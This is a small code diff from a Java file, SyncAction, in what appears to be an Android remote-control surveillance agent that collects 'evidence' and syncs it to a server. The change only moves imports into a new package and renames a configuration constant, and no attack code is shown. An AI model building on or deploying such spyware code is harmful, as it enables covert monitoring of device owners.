@@ -11,14 +11,14 @@ package com.ht.RCSAndroidGUI.action;
 import java.util.Vector;
 
 import com.ht.RCSAndroidGUI.Debug;
-import com.ht.RCSAndroidGUI.Evidence;
-import com.ht.RCSAndroidGUI.EvidenceCollector;
 import com.ht.RCSAndroidGUI.action.sync.Protocol;
 import com.ht.RCSAndroidGUI.action.sync.ProtocolException;
 import com.ht.RCSAndroidGUI.action.sync.Transport;
 import com.ht.RCSAndroidGUI.action.sync.ZProtocol;
-import com.ht.RCSAndroidGUI.agent.Agent;
+import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.agent.AgentManager;
+import com.ht.RCSAndroidGUI.evidence.Evidence;
+import com.ht.RCSAndroidGUI.evidence.EvidenceCollector;
 import com.ht.RCSAndroidGUI.utils.Check;
 
 // TODO: Auto-generated Javadoc
@@ -103,7 +103,7 @@ public abstract class SyncAction extends SubAction {
 		wantReload = false;
 		wantUninstall = false;
 
-		agentManager.reloadAgent(Agent.AGENT_DEVICE);
+		agentManager.reloadAgent(AgentConf.AGENT_DEVICE);
 
 		boolean ret = false;
 
